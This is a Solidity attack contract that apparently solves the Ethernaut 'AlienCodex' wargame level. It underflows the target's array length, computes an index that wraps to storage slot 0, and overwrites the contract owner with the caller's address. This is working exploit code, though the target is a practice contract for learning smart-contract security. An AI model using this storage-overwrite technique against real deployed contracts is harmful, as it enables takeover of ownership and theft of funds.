// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface IAliencodex {
    function makeContact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

contract HackAlienCodex {
    IAliencodex private _alienCodex;

    constructor(address alienCodex) public {
        _alienCodex = IAliencodex(alienCodex);
    }

    function attack() public {
        // Shorten the length of the
        _alienCodex.makeContact();
        _alienCodex.retract();
        (uint i, bytes32 content) = _calculateInputs();
        _alienCodex.revise(i, content);
    }

    function _calculateInputs() internal view returns (uint, bytes32) {
        // Find the largest index possible for a storage slot and add 1 to overflow 
        uint i = (2 ** 256 - 1) - uint(keccak256(abi.encode(1))) + 1;
        // Bytes32 conversion of address for our desired owner
        bytes32 content = bytes32(uint256(uint160(tx.origin)));

        return (i, content);
    }
}